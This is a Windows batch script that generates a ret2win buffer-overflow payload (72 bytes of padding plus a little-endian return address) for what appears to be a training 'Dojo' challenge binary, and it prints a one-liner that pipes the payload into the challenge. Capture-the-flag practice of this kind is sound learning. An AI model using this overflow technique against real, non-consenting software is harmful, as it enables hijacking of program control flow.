@echo off
REM Windows batch script to generate ret2win exploit payload
REM Usage: exploit.bat 0x4011e6

echo ============================================================
echo Dojo 1: ret2win Exploit Generator (Windows)
echo ============================================================
echo.

if "%1"=="" (
    echo ERROR: Please provide the win^(^) address as an argument
    echo.
    echo Usage:
    echo   exploit.bat 0x4011e6
    echo.
    echo First, get the address by running the challenge in your workspace terminal:
    echo   /challenge/challenge
    echo.
    echo Then use that address with this script.
    exit /b 1
)

set WIN_ADDR=%1

echo Target address: %WIN_ADDR%
echo.
echo Generating payload...
echo.

REM Create a temporary Python script
echo import sys > temp_exploit.py
echo win_addr = int('%WIN_ADDR%', 16) >> temp_exploit.py
echo padding = b"A" * 72 >> temp_exploit.py
echo ret_addr = win_addr.to_bytes(8, 'little') >> temp_exploit.py
echo payload = padding + ret_addr >> temp_exploit.py
echo sys.stdout.buffer.write(payload) >> temp_exploit.py

echo Payload generated!
echo.
echo To use this payload in your workspace terminal:
echo.
echo 1. Copy the command below
echo 2. Paste it in your workspace terminal
echo.
echo ============================================================
echo python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + (%WIN_ADDR%).to_bytes(8, 'little'))" ^| /challenge/challenge
echo ============================================================
echo.

REM Clean up
del temp_exploit.py 2>nul

pause
